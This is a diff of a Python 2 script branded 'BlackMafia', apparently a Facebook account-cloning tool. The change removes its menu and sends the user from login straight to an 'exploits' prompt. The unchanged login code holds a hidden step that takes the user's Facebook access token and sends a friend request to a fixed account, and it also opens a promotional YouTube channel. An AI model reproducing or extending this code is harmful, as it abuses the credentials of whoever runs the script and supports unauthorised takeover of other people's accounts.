@@ -197,7 +197,7 @@ def login():
 				print '\n\x1b[1;94mLogin Successful.•◈•..'
 				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
+				available_facebook_motah()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;97mThere is no internet connection"
 				keluar()
@@ -212,55 +212,6 @@ def login():
 			time.sleep(1)
 			login()
 
-
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;97mYour Account is on Checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	except requests.exceptions.ConnectionError:
-		print"\x1b[1;94mThere is no internet connection"
-		keluar()
-	os.system("clear") #Dev:love_hacker
-	print logo
-	print "  \033[1;97m«----•◈••◈•----\033[1;94mLogged in User Info\033[1;97m----•◈••◈•-----»"
-	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
-	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;94mStart USA Cloning..."
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
-	pilih()
-def pilih():
-	unikers = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
-	if unikers =="":
-		print "\x1b[1;97mFill in correctly"
-		pilih()
-	elif unikers =="1":
-		available_facebook_motah()
-	elif unikers =="0":
-		jalan('Token Removed')
-		os.system('rm -rf login.txt')
-		keluar()
-	else:
-		print "\x1b[1;91mFill in correctly"
-		pilih()
-		
 def available_facebook_motah():
  try:
   amerr = str(raw_input(default+'WhoAmi exploits('+red+'available_facebook_motah'+default+') > '))
